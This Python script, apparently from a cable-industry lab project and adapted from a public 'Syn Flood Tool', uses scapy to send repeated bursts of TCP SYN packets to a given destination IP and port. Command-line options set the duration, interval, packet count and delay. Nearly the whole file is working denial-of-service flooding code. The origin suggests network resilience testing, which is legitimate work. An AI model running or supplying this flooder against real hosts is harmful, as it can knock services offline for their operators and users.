#!/usr/bin/python

# Copyright (c) 2019 Cable Television Laboratories, Inc.
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Originally copied from:
#
# Emre Ovunc
# info@emreovunc.com
# Syn Flood Tool Python

import argparse
from logging import getLogger
from time import sleep

from scapy.all import *

filename = 'send_syn'
logger = getLogger(filename)
FORMAT = '%(levelname)s %(asctime)-15s %(filename)s %(message)s'


def random_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def rand_int():
    x = random.randint(1000, 9000)
    return x


def transmit_syn_flood(dest_ip, dst_port, count):
    total = 0
    logger.info("Packets are sending ...")
    for x in range(0, count):
        IP_Packet = IP()
        IP_Packet.dst = dest_ip

        TCP_Packet = TCP()
        TCP_Packet.dport = dst_port
        TCP_Packet.flags = "S"
        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    logger.info("Total packets sent: %i\n" % total)


def syn_attack(args):
    attack_duration = args.duration - args.delay
    end_time = time.time() + attack_duration
    logger.info('Delaying %d seconds' % args.delay)
    sleep(args.delay)
    logger.info(
        'sending %s TCP packets every %s seconds to %s:%s for %s seconds' % (
            args.count, args.interval, args.destination, args.port,
            attack_duration))
    while time.time() < end_time:
        transmit_syn_flood(args.destination, args.port, args.count)
        sleep(args.interval)
    logger.info('Terminating SYN Flood attack')


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--duration',
                        help='Number of seconds to run, 0 means forever',
                        type=int, required=True)
    parser.add_argument('-i', '--interval',
                        help='How often to send packets in seconds',
                        type=float, required=True)
    parser.add_argument('-c', '--count',
                        help='How many packets to send per syn transmission',
                        type=int, required=True)
    parser.add_argument('-y', '--delay', help='Delay before starting run',
                        type=int, required=False, default=0)
    parser.add_argument('-r', '--destination', help='Destination IPv4 address',
                        required=True)
    parser.add_argument('-p', '--port', help='Destination port', type=int,
                        required=True)
    parser.add_argument('-m', '--msg', help='Message to send', required=True)
    parser.add_argument('-l', '--loglevel',
                        help='Log Level <DEBUG|INFO|WARNING|ERROR> defaults '
                             'to INFO',
                        required=False, default='INFO')
    parser.add_argument('-f', '--logfile',
                        help='File to log to defaults to console',
                        required=False, default=None)
    args = parser.parse_args()
    return args


if __name__ == '__main__':
    cmd_args = get_args()
    syn_attack(cmd_args)
